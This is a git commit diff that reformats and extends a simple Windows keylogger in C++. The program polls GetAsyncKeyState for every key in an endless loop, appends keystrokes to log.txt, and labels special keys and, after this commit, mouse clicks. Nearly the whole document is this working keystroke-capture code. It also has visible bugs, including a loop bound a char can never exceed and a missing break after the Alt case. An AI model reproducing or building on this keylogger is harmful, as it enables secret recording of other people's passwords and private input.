973ea89e06825df261c59c4acdfb3e875de611f3
bleak-alpha <71189549+bleak-alpha@users.noreply.github.com>
2023-01-02 19:16:26 +0530

    Changes to be committed: 	modified:   README.md 	modified:   logger.cpp

--- logger.cpp
+++ logger.cpp
@@ -7,50 +7,59 @@ using namespace std;
 
 void WinLogging();
 
-int main() {
+int main()
+{
     WinLogging();
 }
 
-void WinLogging() {
-    while(true){
-        for(char c=0; c<=254 ; c++) {
-            if(GetAsyncKeyState(c) & 0x1) { //comparing last bit from both using AND
+void WinLogging()
+{
+    while (true)
+    {
+        for (char c = 0; c <= 254; c++)
+        {
+            if (GetAsyncKeyState(c) & 0x1)
+            { // comparing last bit from both using AND
                 ofstream log;
-                log.open("log.txt", ios::app); log<<c; //stores o/p in the log file 
-                
-                switch (c) { //for non-alphanumeric keys
-                    case VK_BACK:
-                        log << "[backspace]";
-                        break;
-                    case VK_RETURN:
-                        log << "[enter]";
-                        break;
-                    case VK_SHIFT:
-                        log << "[shift]";
-                        break;
-                    case VK_CONTROL:
-                        log << "[control]";
-                        break;
-                    case VK_CAPITAL:
-                        log << "[cap]";
-                        break;
-                    case VK_TAB:
-                        log << "[tab]";
-                        break;
-                    case VK_MENU:
-                        log << "[alt]";
-                    case VK_LBUTTON:
-                    case VK_RBUTTON:
-                        break;
-                    default:
-                        log << c;
+                log.open("log.txt", ios::app); // stores o/p in the log file
+
+                switch (c)
+                { // for non-alphanumeric keys
+                case VK_BACK:
+                    log << "[backspace]";
+                    break;
+                case VK_RETURN:
+                    log << "[enter]";
+                    break;
+                case VK_SHIFT:
+                    log << "[shift]";
+                    break;
+                case VK_CONTROL:
+                    log << "[control]";
+                    break;
+                case VK_CAPITAL:
+                    log << "[cap]";
+                    break;
+                case VK_TAB:
+                    log << "[tab]";
+                    break;
+                case VK_MENU:
+                    log << "[alt]";
+                case VK_LBUTTON:
+                    log << "[LB]";
+                    break;
+                case VK_RBUTTON:
+                    log << "RB";
+                    break;
+                default:
+                    log << c;
                 }
-                //cout<<c;
-                
+                // cout<<c;
             }
         }
     }
 }
-//Dev note: WinLogging works only for windows system,
-//  bug report:
-//      ->double input recording
+// Dev note: WinLogging works only for windows system,
+//   bug report:                                            To Do:
+//       -> double alphanumeric input [Solved]                  -> Detect Special Keys
+//
